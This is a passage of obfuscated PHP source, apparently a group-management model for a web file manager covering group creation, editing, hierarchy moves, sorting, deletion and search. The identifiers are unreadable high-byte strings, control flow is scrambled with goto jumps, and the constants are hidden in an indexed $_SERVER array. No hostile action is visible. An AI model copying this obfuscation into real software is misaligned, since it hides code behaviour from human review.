array("\x74\141\x62\154\x65\x4e\x61\155\145" => "\147\162\x6f\x75\x70\x5f\x6d\145\164\141", "\x6d\x65\x74\x61\x46\151\145\x6c\x64" => "\147\162\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($Bİ°¯„Ïà) { $F–Ÿã‘„ß =& $_SERVER[œÕÊİğö]; return array($F–Ÿã‘„ß[1794] => array($Bİ°¯„Ïà[0], $F–Ÿã‘„ß[1795]), $F–Ÿã‘„ß[1796] => array($Bİ°¯„Ïà[0], $F–Ÿã‘„ß[1797])); } protected function getInfo($e„‚ÕŒª, $EÛÛÈ¤Ú¬ = false) { $F“¸£†è = $this->getInfoSimple($e„‚ÕŒª); if (!$F“¸£†è) { return !1; } if ($EÛÛÈ¤Ú¬) { return $this->_listDataApplyItem($F“¸£†è); } return $this->cacheFunctionGet($_SERVER[œÕÊİğö][1798], $e„‚ÕŒª); } protected function getInfoSimple($Cì»Òœœ½, $E¶˜©ß·×ì = false) { $aÒŞÎóºÍ =& $_SERVER[œÕÊİğö]; if ($E¶˜©ß·×ì) { $AÅíŠÔ˜Ë¬ = array($aÒŞÎóºÍ[1720] => intval($Cì»Òœœ½)); $C´—Ú˜ÎÈÁ = $this->where($AÅíŠÔ˜Ë¬)->find(); return is_array($C´—Ú˜ÎÈÁ) ? $C´—Ú˜ÎÈÁ : array(); } return $this->cacheFunctionGet($aÒŞÎóºÍ[1799], $Cì»Òœœ½); } protected function groupAdd($fà‰ùŸø×Š) { goto DÆ›ÈÄÔ‚; b´‹’¡—‚: if ($d±µÚŸŞÖÆ[$C•°„¨ÇÛÄ[524]]) { $b’¤Üœ‰¨ = $d±µÚŸŞÖÆ[$C•°„¨ÇÛÄ[524]] . $d±µÚŸŞÖÆ[$C•°„¨ÇÛÄ[1720]] . $C•°„¨ÇÛÄ[57]; } $c ¥Â¹ª± = array($C•°„¨ÇÛÄ[424] => $this->groupNameAuto($fà‰ùŸø×Š[$C•°„¨ÇÛÄ[501]], $fà‰ùŸø×Š[$C•°„¨ÇÛÄ[38]]), $C•°„¨ÇÛÄ[405] => $fà‰ùŸø×Š[$C•°„¨ÇÛÄ[501]], $C•°„¨ÇÛÄ[587] => $b’¤Üœ‰¨, $C•°„¨ÇÛÄ[1800] => $fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1704]], $C•°„¨ÇÛÄ[1801] => 0, $C•°„¨ÇÛÄ[1724] => 0); if (isset($fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1743]])) { $c ¥Â¹ª±[$C•°„¨ÇÛÄ[1743]] = $fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1743]]; } else { $AÖøª‚Îî‘ = $this->max($C•°„¨ÇÛÄ[1743]); if (!$AÖøª‚Îî‘) { $AÖøª‚Îî‘ = 0; } $c ¥Â¹ª±[$C•°„¨ÇÛÄ[1743]] = $AÖøª‚Îî‘ + 1; } goto c †øŸš³ç; c †øŸš³ç: if (!empty($fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1720]])) { $c ¥Â¹ª±[$C•°„¨ÇÛÄ[1720]] = $fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1720]]; } $eá‰ê¦ìºã = $this->add($c ¥Â¹ª±); $this->setNamePinyin($eá‰ê¦ìºã, $c ¥Â¹ª±[$C•°„¨ÇÛÄ[38]]); goto b³¾ÌĞëø; b³¾ÌĞëø: if (isset($fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1802]])) { $this->metaSet($eá‰ê¦ìºã, array($C•°„¨ÇÛÄ[1802] => $fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1802]], $C•°„¨ÇÛÄ[1803] => $fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1803]])); unset($fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1802]]); unset($fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1803]]); } Model($C•°„¨ÇÛÄ[1228])->groupRootAdd($eá‰ê¦ìºã); return $eá‰ê¦ìºã; goto CÛ¾¾ŒÉ¹; DÆ›ÈÄÔ‚: $C•°„¨ÇÛÄ =& $_SERVER[œÕÊİğö]; if (!$fà‰ùŸø×Š[$C•°„¨ÇÛÄ[501]] && isset($fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1720]]) && $fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1720]] == 1) { if ($d±µÚŸŞÖÆ = $this->getInfoSimple($fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1720]], !0)) { return $fà‰ùŸø×Š[$C•°„¨ÇÛÄ[1720]]; } } else { $d±µÚŸŞÖÆ = $this->getInfoSimple($fà‰ùŸø×Š[$C•°„¨ÇÛÄ[501]]); if (!$d±µÚŸŞÖÆ) { return !1; } } $b’¤Üœ‰¨ = $C•°„¨ÇÛÄ[534]; goto b´‹’¡—‚; CÛ¾¾ŒÉ¹: } protected function groupEdit($aóæ ¸ƒ°¨, $E©•äÀ÷–À) { goto A‰È¢Í”ñˆ; d¿¦íÆË¥„: $this->_clearChildrenCache($fÒ½”µªÉã); return $this->where(array($aßŞ†òâ «[1804] => $aóæ ¸ƒ°¨))->save($E©•äÀ÷–À); goto f†Éòè‰É÷; e¹©¥¢Ø„Ş: if (!empty($E©•äÀ÷–À[$aßŞ†òâ «[501]])) { $FÇòéÉÊù = $this->getInfoSimple($E©•äÀ÷–À[$aßŞ†òâ «[501]]); if (!$FÇòéÉÊù) { return !1; } if ($fÒ½”µªÉã[$aßŞ†òâ «[1720]] == $FÇòéÉÊù[$aßŞ†òâ «[1720]]) { return !1; } if ($E©•äÀ÷–À[$aßŞ†òâ «[501]] != $fÒ½”µªÉã[$aßŞ†òâ «[501]]) { if ($FÇòéÉÊù[$aßŞ†òâ «[524]] !== $fÒ½”µªÉã[$aßŞ†òâ «[524]] && strpos($FÇòéÉÊù[$aßŞ†òâ «[524]], $fÒ½”µªÉã[$aßŞ†òâ «[524]] . $fÒ½”µªÉã[$aßŞ†òâ «[1720]] . $aßŞ†òâ «[57]) === 0) { return !1; } $E©•äÀ÷–À[$aßŞ†òâ «[587]] = $FÇòéÉÊù[$aßŞ†òâ «[524]] . $E©•äÀ÷–À[$aßŞ†òâ «[501]] . $aßŞ†òâ «[57]; $this->_changeChildLevel($fÒ½”µªÉã, $FÇòéÉÊù); } } if (isset($E©•äÀ÷–À[$aßŞ†òâ «[38]])) { $this->setNamePinyin($aóæ ¸ƒ°¨, $E©•äÀ÷–À[$aßŞ†òâ «[38]]); } if (isset($E©•äÀ÷–À[$aßŞ†òâ «[1802]])) { $this->metaSet($aóæ ¸ƒ°¨, array($aßŞ†òâ «[1802] => $E©•äÀ÷–À[$aßŞ†òâ «[1802]], $aßŞ†òâ «[1803] => $E©•äÀ÷–À[$aßŞ†òâ «[1803]])); unset($E©•äÀ÷–À[$aßŞ†òâ «[1802]]); unset($E©•äÀ÷–À[$aßŞ†òâ «[1803]]); } goto d¿¦íÆË¥„; A‰È¢Í”ñˆ: $aßŞ†òâ « =& $_SERVER[œÕÊİğö]; $fÒ½”µªÉã = $this->getInfoSimple($aóæ ¸ƒ°¨); if (!$fÒ½”µªÉã) { return !1; } goto e¹©¥¢Ø„Ş; f†Éòè‰É÷: } private function _clearChildrenCache($CßÂïÄÂ) { $aª¢ĞŸ‡„ =& $_SERVER[œÕÊİğö]; $A¿‚‹İ³¬³ = array($aª¢ĞŸ‡„[587] => array($aª¢ĞŸ‡„[547], $CßÂïÄÂ[$aª¢ĞŸ‡„[524]] . $CßÂïÄÂ[$aª¢ĞŸ‡„[1720]] . $aª¢ĞŸ‡„[548])); $dÃØ³Ï’ˆ = $this->field($aª¢ĞŸ‡„[1720])->where($A¿‚‹İ³¬³)->select(); foreach ($dÃØ³Ï’ˆ as $aê’ğ¶æ‡) { $this->_clearCache($aê’ğ¶æ‡[$aª¢ĞŸ‡„[1720]]); } } private function _clearCache($CğµÙÊ›ÎÁ) { $e§ØÍ¶È‘¿ =& $_SERVER[œÕÊİğö]; $this->cacheFunctionClear($e§ØÍ¶È‘¿[1798], $CğµÙÊ›ÎÁ); $this->cacheFunctionClear($e§ØÍ¶È‘¿[1799], $CğµÙÊ›ÎÁ); } private function _changeChildLevel($b»øª¡ç¦½, $cİ¤©ª¬¾ƒ, $bˆŞÎƒ¿œ  = false) { goto FöÌÎÁ£âÔ; déàİ¤½…ó: $this->_clearChildrenCache($b»øª¡ç¦½); $this->where($E¸ô®‘Ê¼¸)->data($FÖŒŠçí™ó)->save(); goto cÃ…ì–Ùìô; FöÌÎÁ£âÔ: $BÅ¤ËóÚÙÉ =& $_SERVER[œÕÊİğö]; $aÆ­Ó İÂù = $b»øª¡ç¦½[$BÅ¤ËóÚÙÉ[524]] . $b»øª¡ç¦½[$BÅ¤ËóÚÙÉ[1720]] . $BÅ¤ËóÚÙÉ[57]; $d«‚ƒàÎ±ò = $cİ¤©ª¬¾ƒ[$BÅ¤ËóÚÙÉ[524]] . $cİ¤©ª¬¾ƒ[$BÅ¤ËóÚÙÉ[1720]] . $BÅ¤ËóÚÙÉ[57] . $b»øª¡ç¦½[$BÅ¤ËóÚÙÉ[1720]] . $BÅ¤ËóÚÙÉ[57]; goto b‰Ğâ´†Øê; b‰Ğâ´†Øê: if ($bˆŞÎƒ¿œ ) { $d«‚ƒàÎ±ò = $cİ¤©ª¬¾ƒ[$BÅ¤ËóÚÙÉ[524]] . $cİ¤©ª¬¾ƒ[$BÅ¤ËóÚÙÉ[1720]] . $BÅ¤ËóÚÙÉ[57]; } $E¸ô®‘Ê¼¸ = array($BÅ¤ËóÚÙÉ[587] => array($BÅ¤ËóÚÙÉ[547], $b»øª¡ç¦½[$BÅ¤ËóÚÙÉ[524]] . $b»øª¡ç¦½[$BÅ¤ËóÚÙÉ[1720]] . $BÅ¤ËóÚÙÉ[548])); $FÖŒŠçí™ó = array($BÅ¤ËóÚÙÉ[587] => array($BÅ¤ËóÚÙÉ[596], "\x72\145\160\154\141\x63\145\x28\x70\x61\162\145\x6e\x74\114\x65\x76\145\x6c\x2c\x27{$aÆ­Ó İÂù}\47\x2c\47{$d«‚ƒàÎ±ò}\x27\x29")); goto déàİ¤½…ó; cÃ…ì–Ùìô: } public function setNamePinyin($cß¾À’«†Ì, $DÈ•‚Ö‚èŠ = false) { $cƒ”íŞÁ‘Ï =& $_SERVER[œÕÊİğö]; if (!$DÈ•‚Ö‚èŠ) { $dĞÒ³¹ÓÂ = $this->getInfoSimple($cß¾À’«†Ì); $DÈ•‚Ö‚èŠ = $dĞÒ³¹ÓÂ[$cƒ”íŞÁ‘Ï[38]]; } if (!Input::check($DÈ•‚Ö‚èŠ, $cƒ”íŞÁ‘Ï[590])) { $this->metaSet($cß¾À’«†Ì, $cƒ”íŞÁ‘Ï[467], null); $this->metaSet($cß¾À’«†Ì, $cƒ”íŞÁ‘Ï[466], null); return; } $fÕ¿îôÅÊ = array($cƒ”íŞÁ‘Ï[467] => str_replace($cƒ”íŞÁ‘Ï[60], $cƒ”íŞÁ‘Ï[43], Pinyin::get($DÈ•‚Ö‚èŠ)), $cƒ”íŞÁ‘Ï[466] => Pinyin::get($DÈ•‚Ö‚èŠ, $cƒ”íŞÁ‘Ï[591])); $this->metaSet($cß¾À’«†Ì, $fÕ¿îôÅÊ); } protected function groupStatus($a©•ÃÆ„›, $dÆ»ØŒÆ) { goto Eß¬Éíç—³; a©¹¡å‚×É: if ($dÆ»ØŒÆ == $aÊ¦ —Á½[97]) { $fãª˜‡ê´ˆ = $this->parentLevelArray($f…§´´¤º®[$aÊ¦ —Á½[524]]); } else { $añªæõæÌ = array($aÊ¦ —Á½[587] => array($aÊ¦ —Á½[547], $f…§´´¤º®[$aÊ¦ —Á½[524]] . $f…§´´¤º®[$aÊ¦ —Á½[1720]] . $aÊ¦ —Á½[548])); $fãª˜‡ê´ˆ = $this->where($añªæõæÌ)->field($aÊ¦ —Á½[1720])->select(); $fãª˜‡ê´ˆ = array_to_keyvalue($fãª˜‡ê´ˆ, $aÊ¦ —Á½[43], $aÊ¦ —Á½[1720]); } $fãª˜‡ê´ˆ[] = $f…§´´¤º®[$aÊ¦ —Á½[1720]]; $bæøÛ‡ù¼ = array(); goto fŠ‡®ÔÛ‹ù; fŠ‡®ÔÛ‹ù: foreach ($fãª˜‡ê´ˆ as $a©•ÃÆ„›) { $bæøÛ‡ù¼[] = array($aÊ¦ —Á½[1720] => $a©•ÃÆ„›, $aÊ¦ —Á½[103] => $aÊ¦ —Á½[740], $aÊ¦ —Á½[382] => $dÆ»ØŒÆ); $this->_clearCache($a©•ÃÆ„›); } return Model($aÊ¦ —Á½[1805])->addAll($bæøÛ‡ù¼, array(), !0); goto AÄ’¯¬ö”«; Eß¬Éíç—³: $aÊ¦ —Á½ =& $_SERVER[œÕÊİğö]; $f…§´´¤º® = $this->getInfoSimple($a©•ÃÆ„›); if (!$f…§´´¤º®) { return !1; } goto a©¹¡å‚×É; AÄ’¯¬ö”«: } protected function groupRemove($Bíƒ†¶¸›ù) { goto eÁ‡”­‹Î¾; bŞˆÕ–ÃáÂ: Model($c¤–Æ•‹ˆ[822])->groupRootRemove($Bíƒ†¶¸›ù); return $this->where($BÆÓ­Øİˆ)->delete(); goto Añ–Û§ˆø½; eÁ‡”­‹Î¾: $c¤–Æ•‹ˆ =& $_SERVER[œÕÊİğö]; $BÆÓ­Øİˆ = array($c¤–Æ•‹ˆ[1720] => $Bíƒ†¶¸›ù); $fÈÅ®”íŞ = $this->where($BÆÓ­Øİˆ)->find(); goto b©Í¢ª…–‹; E¿Ô²Êáğ: $this->where(array($c¤–Æ•‹ˆ[501] => $Bíƒ†¶¸›ù))->save(array($c¤–Æ•‹ˆ[501] => $fÈÅ®”íŞ[$c¤–Æ•‹ˆ[501]])); Model($c¤–Æ•‹ˆ[1805])->where($BÆÓ­Øİˆ)->delete(); Model($c¤–Æ•‹ˆ[1806])->where($BÆÓ­Øİˆ)->delete(); goto bŞˆÕ–ÃáÂ; b©Í¢ª…–‹: if (!$fÈÅ®”íŞ || $fÈÅ®”íŞ[$c¤–Æ•‹ˆ[501]] == 0) { return !1; } $e„¾ğøÙª = $this->getInfoSimple($fÈÅ®”íŞ[$c¤–Æ•‹ˆ[501]]); $this->_changeChildLevel($fÈÅ®”íŞ, $e„¾ğøÙª, !0); goto E¿Ô²Êáğ; Añ–Û§ˆø½: } protected function groupSort($dÍ‰Ø“‘ö) { $F¾Œ‹ÂàÇ =& $_SERVER[œÕÊİğö]; $E†‹Æåªƒ = array(); foreach ($dÍ‰Ø“‘ö as $cËÖØ–éÉï => $CĞŒ©”²Œƒ) { $E†‹Æåªƒ[] = array($F¾Œ‹ÂàÇ[1720], $CĞŒ©”²Œƒ, $F¾Œ‹ÂàÇ[1743], $cËÖØ–éÉï + 1); } $this->saveAll($E†‹Æåªƒ); } public function listData() { $dï‹Øïº— = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dï‹Øïº—[$_SERVER[œÕÊİğö][377]]); return $dï‹Øïº—; } private function _makeOrder($eÀÍºôËˆ = '') { goto E™¦‡Å÷ì; E™¦‡Å÷ì: $c¯¼ëğ­À =& $_SERVER[œÕÊİğö]; $D­¸çİĞš£ = array($c¯¼ëğ­À[1720], $c¯¼ëğ­À[38], $c¯¼ëğ­À[1706], $c¯¼ëğ­À[204]); $b¼™§í£Ñ± = array($c¯¼ëğ­À[451] => $c¯¼ëğ­À[452], $c¯¼ëğ­À[453] => $c¯¼ëğ­À[454]); goto F…Å„ãó‡Æ; F…Å„ãó‡Æ: $E“˜ÁñÆÛš = Input::get($c¯¼ëğ­À[458], $c¯¼ëğ­À[7], $c¯¼ëğ­À[1724], $D­¸çİĞš£); $AÜ¸—§¾£ª = Input::get($c¯¼ëğ­À[459], $c¯¼ëğ­À[7], $c¯¼ëğ­À[1807], array($c¯¼ëğ­À[1807], $c¯¼ëğ­À[453])); $AÜ¸—§¾£ª = $b¼™§í£Ñ±[$AÜ¸—§¾£ª]; goto cÔº®ÑíµÄ; cÔº®ÑíµÄ: $eÀÍºôËˆ = $eÀÍºôËˆ . "{$E“˜ÁñÆÛš}\40{$AÜ¸—§¾£ª}\x2c\x20\147\x72\x6f\165\x70\x49\x44\x20\x61\x73\143"; return $this->order($eÀÍºôËˆ); goto eÖêÇÇªÎ; eÖêÇÇªÎ: } public function listChild($C‘óæŸø§‡) { $bÌë›Ã‡¢— =& $_SERVER[œÕÊİğö]; $eÁÚœ×·½ = $this->where(array($bÌë›Ã‡¢—[501] => $C‘óæŸø§‡))->_makeOrder()->selectPage(200); $this->_listDataApply($eÁÚœ×·½[$bÌë›Ã‡¢—[377]]); return $eÁÚœ×·½; } public function listByID($Aî‘§ˆÑº·) { goto B‘›ÙİÂí; B‘›ÙİÂí: $B³—Ü¦ã°© =& $_SERVER[œÕÊİğö]; if (!$Aî‘§ˆÑº·) { return array(); } $AÍ„Äµóƒ¦ = array($B³—Ü¦ã°©[1720] => array($B³—Ü¦ã°©[7], $Aî‘§ˆÑº·)); goto DïÁÌ ®…Æ; DïÁÌ ®…Æ: $dÊİ“â˜™¬ = $this->where($AÍ„Äµóƒ¦)->select(); $dÊİ“â˜™¬ = array_sort_keep($dÊİ“â˜™¬, $B³—Ü¦ã°©[1720], $Aî‘§ˆÑº·); $this->_listDataApply($dÊİ“â˜™¬); goto dªƒø Â¸–; dªƒø Â¸–: return $dÊİ“â˜™¬; goto B°ËØŠÀ; B°ËØŠÀ: } public function listSearch($F‚Í¨–ÙõÇ) { goto FÕË¾ƒÈ×ö; E§µÆø–à: return $AÊ‚ÇÍÉğ†; goto dØ™•‹–ƒê; dÍñ”µŞ¥é: $AÊ‚ÇÍÉğ† = $AÊ‚ÇÍÉğ† ? $AÊ‚ÇÍÉğ† : array($dğÂ¨±¯®‰[377] => array(), $dğÂ¨±¯®‰[374] => array()); if (!$AÊ‚ÇÍÉğ† || count($AÊ‚ÇÍÉğ†[$dğÂ¨±¯®‰[377]]) < 5 && Input::check($e‹éÀ‡Ğ¥, $dğÂ¨±¯®‰[326])) { goto FÏí‰¦ŒÃ; CÊÔñˆšºğ: $AÊ‚ÇÍÉğ†[$dğÂ¨±¯®‰[374]][$dğÂ¨±¯®‰[376]] = ceil($AÊ‚ÇÍÉğ†[$dğÂ¨±¯®‰[374]][$dğÂ¨±¯®‰[375]] / $AÊ‚ÇÍÉğ†[$dğÂ¨±¯®‰[374]][$dğÂ¨±¯®‰[371]]); goto FÃ£¸†±½Œ; FÏí‰¦ŒÃ: $F×„ˆÅ¿”’ = $this->groupChildrenAll($E½Ù«êÖ¥·); $D¡¹Ï§˜ = $this->_searchFromMeta($dğÂ¨±¯®‰[466], $e‹éÀ‡Ğ¥, 10, $F×„ˆÅ¿”’); $b÷¥ íÂÚØ = $this->_searchFromMeta($dğÂ¨±¯®‰[467], $e‹éÀ‡Ğ¥, 10, $F×„ˆÅ¿”’); goto D––àŸ½ø¢; D––àŸ½ø¢: $EÜÄ °ø¼‡ = array_merge($D¡¹Ï§˜, $b÷¥ íÂÚØ, $AÊ‚ÇÍÉğ†[$dğÂ¨±¯®‰[377]]); $AÊ‚ÇÍÉğ†[$dğÂ¨±¯®‰[377]] = array_unique_by_key($EÜÄ °ø¼‡, $dğÂ¨±¯®‰[1720]); $AÊ‚ÇÍÉğ†[$dğÂ¨±¯®‰[374]][$dğÂ¨±¯®‰[375]] = count($AÊ‚ÇÍÉğ†[$dğÂ¨±¯®‰[377]]); goto CÊÔñˆšºğ; FÃ£¸†±½Œ: } $this->_listDataApply($AÊ‚ÇÍÉğ†[$dğÂ¨±¯®‰[377]]); goto E§µÆø–à; EŒÛåñ‰óº: if (!trim($e‹éÀ‡Ğ¥)) { return !1; } $e‹éÀ‡Ğ¥ = str_replace($dğÂ¨±¯®‰[1810], $dğÂ¨±¯®‰[1811], $e‹éÀ‡Ğ¥); $CÚğâà“ = array($dğÂ¨±¯®‰[1720] => array($dğÂ¨±¯®‰[390], "{$e‹éÀ‡Ğ¥}\x25"), $dğÂ¨±¯®‰[38] => array($dğÂ¨±¯®‰[390], "\45{$e‹éÀ‡Ğ¥}\x25"), $dğÂ¨±¯®‰[981] => $dğÂ¨±¯®‰[1812]); goto FµîÕ¥Í¨; FÕË¾ƒÈ×ö: $dğÂ¨±¯®‰ =& $_SERVER[œÕÊİğö]; $e‹éÀ‡Ğ¥ = $F‚Í¨–ÙõÇ[$dğÂ¨±¯®‰[1808]]; $E½Ù«êÖ¥· = isset($F‚Í¨–ÙõÇ[$dğÂ¨±¯®‰[1809]]) ? $F‚Í¨–ÙõÇ[$dğÂ¨±¯®‰[1809]] : !1; goto EŒÛåñ‰óº; FµîÕ¥Í¨: if ($E½Ù«êÖ¥·) { $D†…¯òïê = $this->getInfoSimple($E½Ù«êÖ¥·); $Dí‚à½Ï…› = $D†…¯òïê[$dğÂ¨±¯®‰[524]] . $E½Ù«êÖ¥· . $dğÂ¨±¯®‰[548]; $CÚğâà“ = array($CÚğâà“, array($dğÂ¨±¯®‰[524] => array($dğÂ¨±¯®‰[390], $Dí‚à½Ï…›))); } $CÚğâà“ = $this->parseWhereLike($CÚğâà“); $AÊ‚ÇÍÉğ† = $this->_makeOrder()->where($CÚğâà“)->selectPage(20); goto dÍñ”µŞ¥é; dØ™•‹–ƒê: } protected function groupChildrenAll($FİƒÖ¡©Ö) { $B›çÏÙçÓ =& $_SERVER[œÕÊİğö]; if (!$FİƒÖ¡©Ö) { return !1; } if (is_string($FİƒÖ¡©Ö)) { $FİƒÖ¡©Ö = array($FİƒÖ¡©Ö); } $EäÔÄèÏ•² = $FİƒÖ¡©Ö; foreach ($FİƒÖ¡©Ö as $Eœš‹¤«óÌ) { $b ËÖ±ïó = $this->getInfoSimple($Eœš‹¤«óÌ); $C™‹…ŠÉ“¥ = array($B›çÏÙçÓ[524] => array($B›çÏÙçÓ[390], $b ËÖ±ïó[$B›çÏÙçÓ[524]] . $Eœš‹¤«óÌ . $B›çÏÙçÓ[548])); $CŒ½´œííƒ = $this->field($B›çÏÙçÓ[1720])->where($C™‹…ŠÉ“¥)->select(); $EäÔÄèÏ•² = array_merge($EäÔÄèÏ•², array_to_keyvalue($CŒ½´œííƒ, $B›çÏÙçÓ[43], $B›çÏÙçÓ[1720])); } return array_unique($EäÔÄèÏ•²); } private function _searchFromMeta($E‘øÙŒ—º–, $e‡µ‡¥¬ÎÓ, $bé±òÙ…ŒÎ, $CôÈ´ùÛô„) { goto c´®“ãîâÇ; FÒ›ØÀÍ¹ñ: if (!$D¨¿“«Í”˜) { return array(); } return $D¨¿“«Í”˜; goto d»õ‘–¸Ã…; a£©ÁŒËÜè: $A‹ê…÷ˆì = $this->parseWhereLike($A‹ê…÷ˆì); if ($CôÈ´ùÛô„) { $A‹ê…÷ˆì[$f˜¶›—²èï[1720]] = array($f˜¶›—²èï[7], $CôÈ´ùÛô„); } $ağê÷ÀŠÙ = Model($f˜¶›—²èï[1813])->where($A‹ê…÷ˆì)->limit($bé±òÙ…ŒÎ)->select(); goto dÒ¡Ôèí¡‡; c´®“ãîâÇ: $f˜¶›—²èï =& $_SERVER[œÕÊİğö]; $e‡µ‡¥¬ÎÓ = strtolower($e‡µ‡¥¬ÎÓ); $A‹ê…÷ˆì = array($f˜¶›—²èï[103] => $E‘øÙŒ—º–, $f˜¶›—²èï[382] => array($f˜¶›—²èï[390], "\45{$e‡µ‡¥¬ÎÓ}\45")); goto a£©ÁŒËÜè; dÒ¡Ôèí¡‡: if (!$ağê÷ÀŠÙ) { return array(); } $ağê÷ÀŠÙ = array_to_keyvalue($ağê÷ÀŠÙ, $f˜¶›—²èï[43], $f˜¶›—²èï[1720]); $D¨¿“«Í”˜ = $this->where(array($f˜¶›—²èï[1804] => array($f˜¶›—²èï[7], $ağê÷ÀŠÙ)))->select(); goto FÒ›ØÀÍ¹ñ; d»õ‘–¸Ã…: } protected function _listDataApplyItem($BŸ‡ô‰“…Ş) { $b„²¯‚ŞŒ = array($BŸ‡ô‰“…Ş); $this->_listDataApply($b„²¯‚ŞŒ); return $b„²¯‚ŞŒ[0]; } protected function _listDataApply(&$BÎèÖ§ŒêÉ) { goto Eßòì ’¶á; B•½Í„™…ª: $this->_listAppendChildren($BÎèÖ§ŒêÉ); $this->_listAppendChildrenMember($BÎèÖ§ŒêÉ); $this->_listAppendMeta($BÎèÖ§ŒêÉ, $E™£ˆ±„‘); goto Eã£ÊÖ¸—; Eßòì ’¶á: $BÖ•¼àËÌÂ =& $_SERVER[œÕÊİğö]; if (!$BÎèÖ§ŒêÉ) { return; } $E™£ˆ±„‘ = array_to_keyvalue($BÎèÖ§ŒêÉ, $BÖ•¼àËÌÂ[43], $BÖ•¼àËÌÂ[1720]); goto B•½Í„™…ª; Eã£ÊÖ¸—: $this->_listAppendParent($BÎèÖ§ŒêÉ); $this->_listAppendSourceRoot($BÎèÖ§ŒêÉ, $E™£ˆ±„‘); goto Dé‹İÛÙŞ; Dé‹İÛÙŞ: } private function _listAppendChildren(&$d”œ©†õ³) { goto E·Ï‘Å¢–°; E·Ï‘Å¢–°: $A¸•‘íãõñ =& $_SERVER[œÕÊİğö]; $eØ—ÚŞ¦ºÑ = array_to_keyvalue($d”œ©†õ³, $A¸•‘íãõñ[43], $A¸•‘íãõñ[1720]); $F¾´”…íĞÛ = array($A¸•‘íãõñ[501] => array($A¸•‘íãõñ[7], $eØ—ÚŞ¦ºÑ)); goto F²·ÔçïÄì; fÈ…øÇ”ÎÏ: foreach ($d”œ©†õ³ as &$AÙîÒœÒĞ‚) { $eÑâ ¼è‡ğ = $AÙîÒœÒĞ‚[$A¸•‘íãõñ[1720]]; $AÙîÒœÒĞ‚[$A¸•‘íãõñ[1815]] = isset($eáù‘Ï÷ÊÕ[$eÑâ ¼è‡ğ]) ? intval($eáù‘Ï÷ÊÕ[$eÑâ ¼è‡ğ]) : !1; } unset($AÙîÒœÒĞ‚); goto C™È¶Ö¨¤Õ; F²·ÔçïÄì: $BÅìùÛ™¡¶ = array($A¸•‘íãõñ[501], $A¸•‘íãõñ[1814] => $A¸•‘íãõñ[503]); $eºŒÉò…Š = $this->field($BÅìùÛ™¡¶)->where($F¾´”…íĞÛ)->group($A¸•‘íãõñ[501])->select(); $eáù‘Ï÷ÊÕ = array_to_keyvalue($eºŒÉò…Š, $A¸•‘íãõñ[501], $A¸•‘íãõñ[503]); goto fÈ…øÇ”ÎÏ; C™È¶Ö¨¤Õ: } private function _listAppendChildrenMember(&$A‡˜¬º¨) { goto e­İùĞµã¡; fÀà‹¯Œ“ñ: $c¾È‰¯ˆ† = array($d¼ééóÖ¿­[1720], $d¼ééóÖ¿­[1814] => $d¼ééóÖ¿­[503]); $cõ—îÓøá = Model($d¼ééóÖ¿­[1806])->field($c¾È‰¯ˆ†)->where($FÖòŠŒ‡§÷)->group($d¼ééóÖ¿­[1720])->select(); $aï¤è®ÙÌœ = array_to_keyvalue($cõ—îÓøá, $d¼ééóÖ¿­[1720], $d¼ééóÖ¿­[503]); goto fÌ„çãÈÓ; fÌ„çãÈÓ: foreach ($A‡˜¬º¨ as &$B¬Ò§ÛÈƒŒ) { $b¶«È¿í²Å = $B¬Ò§ÛÈƒŒ[$d¼ééóÖ¿­[1720]]; $B¬Ò§ÛÈƒŒ[$d¼ééóÖ¿­[1816]] = isset($aï¤è®ÙÌœ[$b¶«È¿í²Å]) ? intval($aï¤è®ÙÌœ[$b¶«È¿í²Å]) : !1; } unset($B¬Ò§ÛÈƒŒ); goto Eë¿º„…‘Š; e­İùĞµã¡: $d¼ééóÖ¿­ =& $_SERVER[œÕÊİğö]; $c•òÀåŞŸø = array_to_keyvalue($A‡˜¬º¨, $d¼ééóÖ¿­[43], $d¼ééóÖ¿­[1720]); $FÖòŠŒ‡§÷ = array($d¼ééóÖ¿­[1720] => array($d¼ééóÖ¿­[7], $c•òÀåŞŸø)); goto fÀà‹¯Œ“ñ; Eë¿º„…‘Š: } private function _listAppendMeta(&$AÅî¹÷×É†, $déŠŞã–à) { goto f¶ÓÄµ¬º; Bİ¥¥æö‹: $d­Õ¹Æ = array_to_keyvalue_group($d­Õ¹Æ, $cõï®Œóèø[1720]); foreach ($d­Õ¹Æ as &$fô¬Ş“…Ü÷) { $fô¬Ş“…Ü÷ = array_to_keyvalue($fô¬Ş“…Ü÷, $cõï®Œóèø[103], $cõï®Œóèø[382]); } unset($fô¬Ş“…Ü÷); goto f”Œ—ÀÅ·; f¶ÓÄµ¬º: $cõï®Œóèø =& $_SERVER[œÕÊİğö]; $b®÷‚’¤¨ = array($cõï®Œóèø[1720] => array($cõï®Œóèø[7], $déŠŞã–à)); $d­Õ¹Æ = Model($cõï®Œóèø[1805])->where($b®÷‚’¤¨)->select(); goto Bİ¥¥æö‹; f”Œ—ÀÅ·: foreach ($AÅî¹÷×É† as &$C’÷ŒÛºÄÒ) { $C’÷ŒÛºÄÒ[$cõï®Œóèø[468]] = array(); if (isset($d­Õ¹Æ[$C’÷ŒÛºÄÒ[$cõï®Œóèø[1720]]])) { $C’÷ŒÛºÄÒ[$cõï®Œóèø[468]] = $d­Õ¹Æ[$C’÷ŒÛºÄÒ[$cõï®Œóèø[1720]]]; } } unset($C’÷ŒÛºÄÒ); goto B¡œà–ÌŒñ; B¡œà–ÌŒñ: } protected function parentLevelArray($cèã´‰´Á) { $eÜÁƒö†öè =& $_SERVER[œÕÊİğö]; $cèã´‰´Á = explode($eÜÁƒö†öè[57], trim($cèã´‰´Á, $eÜÁƒö†öè[57])); $cèã´‰´Á = array_remove_value($cèã´‰´Á, $eÜÁƒö†öè[201]); return $cèã´‰´Á; } private function _listAppendParent(&$E™Œ°ãã‹í) { goto Dµ¸¤ç—éæ; C¡”æèâİ: if 